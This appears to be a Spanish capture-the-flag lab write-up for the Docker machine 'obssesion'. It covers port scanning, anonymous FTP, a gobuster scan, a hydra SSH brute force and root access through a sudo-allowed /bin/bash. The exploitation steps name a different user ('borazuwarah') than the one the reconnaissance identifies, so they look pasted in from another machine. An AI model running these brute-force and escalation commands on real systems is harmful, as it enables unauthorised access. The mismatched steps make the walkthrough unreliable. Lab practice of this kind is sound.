---
Maquina: obssesion
SO: Linux
Explotación: Análisis de imágenes
Escala_privs: Permisos sudo
Dificultad: Muy fácil
tags:
  - maquina
  - fuerza_bruta
  - analisis_imagen
  - linux
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sV -Pn 172.17.0.2
```

![[Pasted image 20241021134220.png]]

2. **Acceso al ftp mediante usuario Anonymous y descarga de documentos**:

![[Pasted image 20241021134332.png]]

3. **Análisis de los documentos descargados**:

![[Pasted image 20241021134500.png]]

Como se puede apreciar, hay un chat curioso con los usuarios Gonza y Russski (ya tenemos posibles nombres de usuario, también se menciona una tal Nágore):

4. **Investigación del portal web**:

Como hemos observado hay un portal web activo en el puerto 80, así que vamos a indagar en el a ver que encontramos.

Tras pasar la herramienta gobuster tenemos el siguiente resultado:

```bash 
gobuster dir -u http://172.17.0.2/ -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/common.txt
```

![[Pasted image 20241021135840.png]]

Si observamos en el path /backup nos ha dejado un mensaje importante:

![[Pasted image 20241021140154.png]]

Ahora ya sabemos que el usuario que utiliza es russoski.

## Explotación:

4. **Acceso al SSH por Fuerza Bruta**:

Con el usuario borazuwarah, vamos a intentar hacer un ataque de hydra para poder acceder al SSH

```bash 
hydra -l borazuwarah -P /home/alejandro/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt  ssh://172.17.0.2 
```

![[Pasted image 20241019154043.png]]

Listo, ya sabemos la contraseña del usuario borazuwarah -> 123456

![[Pasted image 20241019154520.png]]

Una vez dentro ya podemos pasar a la escala de privilegios.

5. **Escala de privilegios**:

Para ver los permisos que tenemos con el comando sudo podemos ejecutar:

```bash 
sudo -l
```

![[Pasted image 20241019154627.png]]

Como podemos apreciar se puede ejecutar /bin/bash como sudo.... Así que vamos a ejecutarlo.

```bash 
sudo /bin/bash
```

![[Pasted image 20241019154727.png]]